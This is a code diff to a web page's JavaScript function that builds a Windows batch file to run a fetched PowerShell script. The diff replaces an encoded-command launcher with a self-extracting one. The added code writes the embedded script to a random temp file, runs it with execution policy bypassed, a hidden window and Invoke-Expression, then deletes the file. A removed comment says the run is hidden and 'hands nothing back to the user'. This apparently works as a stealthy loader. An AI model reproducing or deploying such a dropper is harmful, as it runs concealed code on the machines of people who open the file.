@@ -91,7 +91,7 @@ function meta(){
   };
 }
 
-/* builds a .bat that runs the checker hidden and hands nothing back to the user */
+/* builds a self-extracting .bat: script is inlined, so no long command line */
 async function buildBat(run){
   const res = await fetch("vault.txt?x=" + Date.now(), { cache: "no-store" });
   let ps = await res.text();
@@ -99,24 +99,14 @@ async function buildBat(run){
          .split("__SITE__").join(new URL("site.html", location.href).href)
          .split("__MANUAL__").join(new URL("test.html?r=" + run, location.href).href);
 
-  /* powershell -EncodedCommand needs UTF-16LE base64 */
-  const u8 = new Uint8Array(ps.length * 2);
-  for (let i = 0; i < ps.length; i++) {
-    const c = ps.charCodeAt(i);
-    u8[i * 2] = c & 255;
-    u8[i * 2 + 1] = c >> 8;
-  }
-  let bin = "";
-  for (const b of u8) bin += String.fromCharCode(b);
-  const b64 = btoa(bin);
-
-  /* cmd caps a line at 8191 chars, so chunk it */
-  const parts = b64.match(/.{1,4000}/g);
-  let bat = "@echo off\r\ntitle test\r\nset B=\r\n";
-  for (const p of parts) bat += "set B=%B%" + p + "\r\n";
-  bat += 'if not defined B start "" "' + new URL("test.html?r=" + run, location.href).href + '" & exit /b\r\n';
-  bat += "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand %B%\r\nexit /b\r\n";
-  return bat;
+  const body = ps.split(/\r?\n/).map(l => "::" + l).join("\r\n");
+  return "@echo off\r\n" +
+    "title test\r\n" +
+    'set "B=%TEMP%\\t_%RANDOM%.ps1"\r\n' +
+    'findstr /b "::" "%~f0" > "%B%"\r\n' +
+    'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$s=[IO.File]::ReadAllText([Environment]::GetEnvironmentVariable('"'"'B'"'"')); $s=$s -replace '"'"'(?m)^::'"'"','"'"''"'"'; Invoke-Expression $s"\r\n' +
+    'del "%B%" >nul 2>&1\r\n' +
+    "exit /b\r\n" + body + "\r\n";
 }
 
 function save(text, name){
